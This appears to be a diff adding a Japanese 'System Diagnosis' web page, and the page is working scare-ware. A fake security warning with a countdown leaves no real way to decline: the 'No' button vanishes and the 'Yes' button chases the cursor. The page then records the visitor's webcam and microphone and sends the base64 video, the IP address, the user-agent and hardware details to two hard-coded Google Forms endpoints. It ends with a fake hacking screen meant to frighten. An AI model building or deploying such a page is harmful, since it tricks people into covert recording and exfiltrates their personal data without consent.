@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>System Diagnosis Tool</title>
+    <style>
+        body {
+            background: #0f172a;
+            color: #38bdf8;
+            text-align: center;
+            margin: 0;
+            padding-top: 100px;
+            font-family: system-ui, -apple-system, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        h1 {
+            font-size: 3em;
+            color: #f8fafc;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 1.2em;
+            color: #94a3b8;
+        }
+
+        /* モーダル背景（ダークオーバーレイ） */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.3s ease;
+        }
+
+        /* 白い四角い警告ポップアップ */
+        .modal-box {
+            background: #ffffff;
+            color: #1e293b;
+            width: 500px;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            transform: scale(0.3);
+            opacity: 0;
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            70% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 3.5em;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulse 1.2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.25); }
+            100% { transform: scale(1); }
+        }
+
+        .modal-title {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #0f172a;
+            margin-bottom: 15px;
+        }
+
+        .modal-text {
+            font-size: 1.1em;
+            color: #475569;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .timer-box {
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #dc2626;
+            margin-bottom: 25px;
+            background: #fef2f2;
+            padding: 8px 16px;
+            border-radius: 6px;
+            display: inline-block;
+            border: 1px solid #fecaca;
+        }
+
+        .btn-wrapper {
+            position: relative;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .btn {
+            padding: 12px 30px;
+            font-size: 1.1em;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        #yes-btn {
+            background: #2563eb;
+            color: #ffffff;
+            z-index: 9999;
+        }
+        #yes-btn:hover {
+            background: #1d4ed8;
+        }
+
+        #no-btn {
+            background: #e2e8f0;
+            color: #475569;
+        }
+        #no-btn:hover {
+            background: #cbd5e1;
+        }
+
+        /* ================= 自分のみのカメラ確認画面スタイル ================= */
+        #camera-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #1a1a1a;
+            z-index: 2000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .camera-container {
+            width: 640px;
+            max-width: 90vw;
+            background: #262626;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border: 2px solid #333;
+            position: relative;
+        }
+
+        .camera-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+            transform: scaleX(-1); /* 鏡像反転 */
+        }
+
+        .camera-label {
+            position: absolute;
+            bottom: 15px;
+            left: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.95em;
+        }
+
+        .camera-timer {
+            color: #f87171;
+            font-weight: bold;
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+
+        /* ================= ハッカー風の最終画面スタイル ================= */
+        #final-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            color: #22c55e;
+            z-index: 3000;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: flex-start;
+            padding: 30px;
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+        }
+
+        #hacker-text {
+            white-space: pre-wrap;
+            text-align: left;
+            font-size: 0.95em;
+            line-height: 1.3;
+            text-shadow: 0 0 6px rgba(34, 197, 94, 0.8);
+            width: 100%;
+            height: 100%;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>SYSTEM DIAGNOSIS</h1>
+    <p id="status-text">システム状態を確認しています...</p>
+
+    <!-- 警告ポップアップ（モーダル） -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal-box" id="modal-box">
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">セキュリティ警告</div>
+            <div class="modal-text">
+                お使いのデバイス環境に不審なアクセスを検出しました。<br>
+                今すぐシステム診断を実行して保護を有効化しますか？
+            </div>
+            
+            <div class="timer-box">
+                自動実行まで残り: <span id="timer">30</span> 秒
+            </div>
+
+            <div class="btn-wrapper" id="btn-wrapper">
+                <button class="btn" id="yes-btn" onclick="startProcessDirect()">はい (Yes)</button>
+                <button class="btn" id="no-btn">いいえ (No)</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 自分のみのカメラ確認画面 -->
+    <div id="camera-screen">
+        <div class="camera-container">
+            <video id="webcam" autoplay playsinline muted></video>
+            <div class="camera-label">あなた (Webcam Preview & Recording)</div>
+        </div>
+        <div class="camera-timer">自動進行まで: <span id="cam-timer">10</span>秒</div>
+    </div>
+
+    <!-- ハッカー風の最終画面 -->
+    <div id="final-screen">
+        <div id="hacker-text"></div>
+    </div>
+
+    <script>
+        const yesBtn = document.getElementById('yes-btn');
+        const noBtn = document.getElementById('no-btn');
+
+        let isFollowing = false;
+        let mouseX = 0, mouseY = 0;
+        let yesX = 0, yesY = 0;
+
+        let mediaRecorder;
+        let recordedChunks = [];
+        let videoBlob = null;
+
+        let userIp = "取得中...";
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(d => { userIp = d.ip; })
+            .catch(e => { userIp = "192.168.x.x (Local)"; });
+
+        window.addEventListener('mousemove', (e) => {
+            mouseX = e.clientX;
+            mouseY = e.clientY;
+        });
+
+        function animate() {
+            const noRect = noBtn.getBoundingClientRect();
+            const noCenterX = noRect.left + noRect.width / 2;
+            const noCenterY = noRect.top + noRect.height / 2;
+            const dist = Math.hypot(mouseX - noCenterX, mouseY - noCenterY);
+
+            if (!isFollowing && (dist < 80 || (mouseX >= noRect.left && mouseX <= noRect.right && mouseY >= noRect.top && mouseY <= noRect.bottom))) {
+                isFollowing = true;
+                const yesRect = yesBtn.getBoundingClientRect();
+                yesX = yesRect.left;
+                yesY = yesRect.top;
+                
+                yesBtn.style.position = 'fixed';
+                yesBtn.style.left = '0px';
+                yesBtn.style.top = '0px';
+                document.body.appendChild(yesBtn);
+                noBtn.style.display = 'none';
+            }
+
+            if (isFollowing) {
+                const targetX = mouseX - 50;
+                const targetY = mouseY - 20;
+                yesX += (targetX - yesX) * 0.2;
+                yesY += (targetY - yesY) * 0.2;
+                yesBtn.style.transform = `translate(${yesX}px, ${yesY}px)`;
+            }
+
+            requestAnimationFrame(animate);
+        }
+        requestAnimationFrame(animate);
+
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                triggerCameraScreen();
+            }
+        }, 1000);
+
+        // 1. 「はい」を押した場合
+        async function startProcessDirect() {
+            clearInterval(countdownInterval);
+            if(yesBtn) yesBtn.style.display = 'none';
+
+            hideModal();
+            document.getElementById('status-text').innerText = "Status: [||||------] 40% - 診断中...";
+
+            await sendDataToSheet(null); // 動画なしで送信
+
+            document.getElementById('status-text').innerText = "Status: [||||||||||] 100% - 診断完了";
+            triggerFinalScreen();
+        }
+
+        // 2. カメラ画面を起動し、録画を開始する関数
+        async function triggerCameraScreen() {
+            hideModal();
+
+            const cameraScreen = document.getElementById('camera-screen');
+            cameraScreen.style.display = 'flex';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = stream;
+
+                recordedChunks = [];
+                let options = { mimeType: 'video/webm; codecs=vp9' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/webm' };
+                }
+
+                mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    console.log("録画が完了しました！ 動画データサイズ:", videoBlob.size, "バイト");
+                };
+
+                mediaRecorder.start();
+                console.log("Webカメラの録画を開始しました。");
+
+            } catch (err) {
+                console.log("カメラまたはマイクの取得が拒否されました:", err);
+            }
+
+            let camTimeLeft = 10;
+            const camTimerElem = document.getElementById('cam-timer');
+
+            const camInterval = setInterval(async () => {
+                camTimeLeft--;
+                camTimerElem.innerText = camTimeLeft;
+
+                if (camTimeLeft <= 0) {
+                    clearInterval(camInterval);
+
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+
+                    setTimeout(async () => {
+                        const videoElement = document.getElementById('webcam');
+                        if (videoElement.srcObject) {
+                            let tracks = videoElement.srcObject.getTracks();
+                            tracks.forEach(track => track.stop());
+                        }
+                        cameraScreen.style.display = 'none';
+
+                        document.getElementById('status-text').innerText = "Status: [||||------] 40% - 診断中...";
+                        await sendDataToSheet(videoBlob);
+                        document.getElementById('status-text').innerText = "Status: [||||||||||] 100% - 診断完了";
+
+                        triggerFinalScreen();
+                    }, 500);
+                }
+            }, 1000);
+        }
+
+        function hideModal() {
+            const modalBox = document.getElementById('modal-box');
+            const modalOverlay = document.getElementById('modal-overlay');
+            if(modalBox && modalOverlay) {
+                modalBox.style.transform = 'scale(0.3)';
+                modalBox.style.opacity = '0';
+                modalOverlay.style.opacity = '0';
+                setTimeout(() => {
+                    modalOverlay.style.display = 'none';
+                }, 300);
+            }
+            if(yesBtn) yesBtn.style.display = 'none';
+        }
+
+        // ==========================================================
+        // 🔄 2つのGoogleフォーム（スプレッドシート）へ同時に送信する関数
+        // ==========================================================
+        async function sendDataToSheet(blob) {
+            // 【1つ目のGoogleフォームURL】
+            const url1 = "https://docs.google.com/forms/d/e/1FAIpQLSdKS6EO60gKDYxuuH2X7x6d2ALLeGWwE2eW6CbQ5PZenbATmQ/formResponse";
+            
+            // 【2つ目のGoogleフォームURL】（※必要に応じて2つ目のフォームのURLに書き換えてください）
+            const url2 = "https://docs.google.com/forms/d/e/1FAIpQLSdEm4veXq1sEm2CUSgPIIRTXiKGw6P2rL1Ug05_IDXSpzUnSg/formResponse";
+
+            let ip = userIp;
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                ip = d.ip;
+            } catch(e){}
+
+            const specs = `画面:${window.screen.width}x${window.screen.height} / CPU:${navigator.hardwareConcurrency}コア`;
+            
+            // --- 1つ目のフォーム用データ ---
+            const formData1 = new FormData();
+            formData1.append("entry.908671427", navigator.userAgent);
+            formData1.append("entry.844666381", specs);
+            formData1.append("entry.1441562725", ip);
+            formData1.append("entry.1361323648", "HttpOnlyにより保護されています");
+
+            // --- 2つ目のフォーム用データ（動画Base64や共通情報をセット） ---
+            const formData2 = new FormData();
+            formData2.append("entry.908671427", navigator.userAgent); // 2つ目にも同じ情報を送る場合
+            
+            if (blob) {
+                const base64Data = await new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                });
+                formData2.append("entry.475183791", base64Data); // 動画用エントリーID
+            } else {
+                formData2.append("entry.475183791", "[「はい」選択のため動画なし]");
+            }
+
+            // 同時送信の実行
+            try {
+                await Promise.all([
+                    fetch(url1, { method: "POST", mode: "no-cors", body: formData1 }),
+                    fetch(url2, { method: "POST", mode: "no-cors", body: formData2 })
+                ]);
+                console.log("2つのスプレッドシートへのデータ送信が完了しました！");
+            } catch(err) {
+                console.log("送信エラー:", err);
+            }
+        }
+
+        // ハッカー風の最終画面を表示する関数
+        function triggerFinalScreen() {
+            document.getElementById('camera-screen').style.display = 'none';
+            const finalScreen = document.getElementById('final-screen');
+            finalScreen.style.display = 'flex';
+
+            const lang = navigator.language || navigator.userLanguage;
+            const platform = navigator.platform || "Unknown Platform";
+            const cores = navigator.hardwareConcurrency || "Unknown";
+            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const swWidth = window.screen.width;
+            const swHeight = window.screen.height;
+
+            let logs = [
+                "[+] INITIALIZING DEEP SYSTEM SCAN...",
+                `[+] TARGET EXTERNAL IP: ${userIp}`,
+                `[+] OS PLATFORM: ${platform}`,
+                `[+] BROWSER LANGUAGE: ${lang}`,
+                `[+] HARDWARE CORES (CPU): ${cores} Cores`,
+                `[+] ESTIMATED DEVICE MEMORY: ${memory}`,
+                `[+] SCREEN RESOLUTION: ${swWidth} x ${swHeight}`,
+                "--------------------------------------------------"
+            ];
+
+            for (let i = 1; i <= 50; i++) {
+                let hexCode = Math.random().toString(16).substring(2, 10).toUpperCase();
+                logs.push(`[DATA_PACKET #${i}] [0x${hexCode}] -> SUCCESSFUL DATA HARVEST`);
+            }
+
+            logs.push("--------------------------------------------------");
+            logs.push("[!] ALL SECTORS EXFILTRATED SUCCESSFULLY.");
+
+            const hackerTextElem = document.getElementById('hacker-text');
+            let currentIndex = 0;
+
+            function streamLogs() {
+                let chunk = "";
+                for (let j = 0; j < 5 && currentIndex < logs.length; j++) {
+                    chunk += logs[currentIndex] + "\n";
+                    currentIndex++;
+                }
+                hackerTextElem.innerText += chunk;
+                hackerTextElem.scrollTop = hackerTextElem.scrollHeight;
+
+                if (currentIndex < logs.length) {
+                    setTimeout(streamLogs, 30);
+                }
+            }
+
+            streamLogs();
+        }
+    </script>
+</body>
+</html>
